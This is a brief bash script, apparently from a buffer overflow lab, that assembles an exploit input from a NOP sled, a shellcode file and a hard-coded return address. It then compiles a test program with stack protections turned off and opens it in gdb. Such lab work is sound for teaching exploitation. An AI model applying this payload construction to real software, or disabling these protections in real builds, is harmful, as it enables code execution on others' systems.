#!/bin/bash

# Show the file permissions
echo -e "\nFile permissions of the files in the folder:\n"
ls -l

# Dissamble the binary file into assembly
ndisasm -b 32 ./00_shellcode &> 02_shellcode.asm

# Show the NOP command
echo -e "\nNOP Command:"
perl -e 'print "\x90"' | ndisasm -b 32 -
echo -e "\n"

# Create the exploitation file '03_iv'
{
    perl -e 'print "\x90"x59'           # NOP slead (59 bytes)
    cat 00_shellcode                    # Shellcode (45 bytes)
    perl -e 'print "\xca\xf8\xff\xbf"'  # Shellcode address (4 byte)
} > 03_iv

# Create a hex dump and the exploitation file
hd ./03_iv &> 04_iv_hexdump.txt

# Compile the vuln 
gcc -o 06_vuln 05_vuln.c -m32 -fno-stack-protector -z execstack -fno-PIE \
 -no-pie -g &> /dev/null
 
# Start the gnu debugger
gdb -q ./06_vuln

# Remove the compiled files
rm ./06_vuln 

